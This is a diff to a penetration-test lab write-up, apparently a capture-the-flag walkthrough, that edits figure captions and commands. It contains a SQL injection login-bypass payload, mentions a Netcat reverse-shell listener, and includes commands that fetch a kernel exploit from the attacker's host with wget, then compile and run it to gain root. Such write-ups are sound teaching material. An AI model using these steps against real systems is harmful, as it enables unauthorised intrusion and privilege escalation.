@@ -35,6 +35,8 @@ Navigating to `http://192.168.0.24` revealed an administrative web login prompt.
 ```text
 admin' OR '1'='1
 ```
+![Nmap Scan Results](images/sql_command_lvl2.png)
+*Figure 2: SQL Injection Command.*
 *The password field was left completely blank.*
 
 **Result:** The database logic evaluated the statement as universally true, ignored the password validation parameter, and successfully authenticated entry into the panel dashboard.
@@ -65,7 +67,7 @@ apache
 
 <!-- 🖼️ PLACE SECOND IMAGE HERE -->
 ![Initial Access Foothold](foothold_lvl2.png)
-*Figure 2: Successfully catching the interactive shell session using a Netcat listener.*
+*Figure 3: Successfully catching the interactive shell session using a Netcat listener.*
 
 ---
 
@@ -85,8 +87,8 @@ The exploit module (`5093.c`) was staged inside the Kali environment, served ove
 ```bash
 # On Target Environment Shell
 cd /tmp
-wget http://192.168.0
-gcc -o rootme exploit.c
+wget http://192.168.0.21/
+gcc -o rootme 9542.c
 ./rootme
 ```
 
@@ -99,7 +101,7 @@ root
 
 <!-- 🖼️ PLACE THIRD IMAGE HERE -->
 ![Privilege Escalation to Root](root_escalation_lvl2.png)
-*Figure 3: Compiling and executing the vmsplice exploit module to obtain administrative shell status.*
+*Figure 4: Compiling and executing the vmsplice exploit module to obtain administrative shell status.*
 
 ---
 
